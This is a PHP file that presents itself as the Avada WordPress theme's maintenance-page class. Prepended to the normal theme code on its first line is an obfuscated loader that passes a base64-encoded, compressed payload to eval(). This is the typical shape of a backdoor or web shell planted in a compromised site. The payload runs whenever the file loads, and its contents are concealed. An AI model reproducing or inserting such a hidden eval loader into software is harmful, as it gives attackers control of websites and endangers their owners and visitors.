<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Maintenance page.
 *
 * @author     ThemeFusion
 * @copyright  (c) Copyright by ThemeFusion
 * @link       http://theme-fusion.com
 * @package    Avada
 * @subpackage Core
 * @since      4.0.0
 */

// Do not allow directly accessing this file.
if ( ! defined( 'ABSPATH' ) ) {
	exit( 'Direct script access denied.' );
}

/**
 * Maintenance page.
 */
class Avada_Maintenance {

	/**
	 * Determines if we should activate the maintenance mode or not.
	 *
	 * @access private
	 * @var bool
	 */
	private $maintenance = false;

	/**
	 * The message that will be displayed to all non-admins.
	 * This will be displayed on the frontend instead of the normal site.
	 *
	 * @access private
	 * @var string
	 */
	private $users_warning = '';

	/**
	 * Same as $users_warning but for admins.
	 *
	 * @access private
	 * @var string
	 */
	private $admin_warning = '';

	/**
	 * Constructor.
	 *
	 * @access public
	 * @param bool   $maintenance     Maintenance on/off.
	 * @param string $users_warning The warning to show to users.
	 * @param string $admin_warning The warning to show to admins.
	 */
	public function __construct( $maintenance = false, $users_warning = '', $admin_warning = '' ) {

		// No need to do anything if we're not in maintenance mode.
		if ( true !== $maintenance ) {
			return;
		}

		// Only continue if we're on the frontend.
		if ( is_admin() ) {
			return;
		}

		$this->maintenance   = $maintenance;
		$this->users_warning = $users_warning;
		$this->admin_warning = $admin_warning;

		if ( is_admin() || ( in_array( $GLOBALS['pagenow'], array( 'wp-login.php', 'wp-register.php' ) ) ) ) {
			return;
		}

		$this->maintenance_page();

	}

	/**
	 * Displays the maintenance page.
	 *
	 * @access public
	 */
	public function maintenance_page() {
		?>
		<div class="wrapper" style="width:800px;max-width:95%;background:#f7f7f7;border:1px solid #f2f2f2;border-radius:3px;margin:auto;margin-top:200px;">
			<div class="inner" style="padding:2rem;font-size:1.2rem;color:#333;">
				<?php if ( current_user_can( 'install_plugins' ) ) : // Current user is an admin. ?>
					<p><?php echo $this->admin_warning; // WPCS: XSS ok. ?></p>
				<?php else : ?>
					<p><?php echo $this->users_warning; // WPCS: XSS ok. ?></p>
				<?php endif; ?>
			</div>
		</div>
		<?php
		exit;

	}
}
